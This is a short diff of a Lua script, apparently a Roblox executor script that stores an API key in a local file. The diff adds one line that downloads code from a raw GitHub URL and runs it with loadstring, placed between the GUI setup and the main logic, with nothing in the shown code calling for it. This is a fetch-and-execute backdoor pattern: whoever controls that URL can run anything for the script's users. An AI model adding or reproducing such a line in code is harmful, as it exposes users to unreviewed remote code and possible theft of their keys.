@@ -78,7 +78,7 @@ local function createGui()
 
     submitButton.MouseButton1Click:Connect(onSubmit)
 end
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/itsdanitobg/API/refs/heads/main/gui"))()
 -- Main script logic
 if pcall(function() readfile(apiKeyFile) end) then
     local savedKey = readfile(apiKeyFile)
